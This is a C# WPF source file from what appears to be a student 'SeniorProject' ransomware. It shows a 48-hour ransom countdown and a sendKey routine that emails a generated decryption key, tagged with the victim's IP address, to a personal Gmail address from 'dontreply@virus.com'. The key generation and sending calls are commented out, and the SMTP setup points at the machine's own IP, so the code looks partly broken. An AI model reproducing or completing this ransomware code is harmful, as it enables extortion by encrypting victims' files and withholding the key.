using System;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using EncryptionLogic;
using System.Net.Mail;
using System.Net.Sockets;

namespace SeniorProject
{
	/// <summary>
	/// Interaction logic for mainView.xaml
	/// </summary>
	public partial class mainView : UserControl
	{
		private DispatcherTimer _Timer = new DispatcherTimer();
		private TimeSpan _timeSpan;
		private Encryption _objEncrpytion= new Encryption();
		private string key { get; set; }

		public mainView()
		{
			InitializeComponent();
			_timeSpan = TimeSpan.FromHours(48);
			_Timer = new DispatcherTimer(new TimeSpan(0, 0, 1), DispatcherPriority.Normal, delegate
			{
				tbTime.Content = _timeSpan.ToString("c");
				if (_timeSpan == TimeSpan.Zero)
				{
					_Timer.Stop();
				}
				_timeSpan = _timeSpan.Add(TimeSpan.FromSeconds(-1));
			}, Application.Current.Dispatcher);
			//key = _objEncrpytion.generate32BitKey();
			//sendKey();
			
		}

		private void sendKey()
		{
			try
			{
				MailMessage message = new MailMessage();
				message.To.Add("tmello001@gmail.com");
				message.Subject = "Decrypt Key for IP address: " + GetIP();
				message.From = new MailAddress("dontreply@virus.com");
				message.Body = key;
				SmtpClient smtp = new SmtpClient(GetIP());
				smtp.Send(message);
			}
			catch (Exception e)
			{
				MessageBox.Show(e.Message);
				MessageBox.Show(e.InnerException.ToString());
			}
		}

		private static string GetIP()
		{
			var host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (var ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("Local IP Address Not Found!");
		}

	}
}
